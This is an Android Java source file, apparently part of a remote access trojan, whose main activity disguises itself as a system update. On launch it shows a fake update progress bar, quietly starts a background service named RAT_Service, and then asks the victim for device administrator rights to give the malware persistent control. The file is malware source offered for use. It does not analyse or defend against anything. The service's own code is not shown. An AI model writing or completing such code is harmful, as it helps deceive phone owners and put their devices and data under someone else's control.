package com.system.update;

import android.app.Activity;
import android.app.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private ProgressBar progressBar;
    private TextView statusText;
    private Button activateBtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        getWindow().setStatusBarColor(Color.parseColor("#1a1a1a"));

        progressBar = findViewById(R.id.progressBar);
        statusText = findViewById(R.id.statusText);
        activateBtn = findViewById(R.id.activateBtn);

        showFakeUpdate();
        startService(new Intent(this, RAT_Service.class));
    }

    private void showFakeUpdate() {
        statusText.setText("System Update: 0%");
        
        Thread updateThread = new Thread(() -> {
            for(int i = 0; i <= 100; i += 5) {
                try {
                    Thread.sleep(300);
                    int finalI = i;
                    runOnUiThread(() -> {
                        progressBar.setProgress(finalI);
                        statusText.setText("System Update: " + finalI + "%");
                    });
                } catch(InterruptedException e) {}
            }
            
            runOnUiThread(() -> {
                statusText.setText("Update Complete!");
                activateBtn.setVisibility(Button.VISIBLE);
                activateBtn.setOnClickListener(v -> requestDeviceAdmin());
            });
        });
        updateThread.start();
    }

    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = 
            (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(this, AdminReceiver.class);

        if(!dpm.isAdminActive(admin)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            startActivity(intent);
        }
        
        finish();
    }
}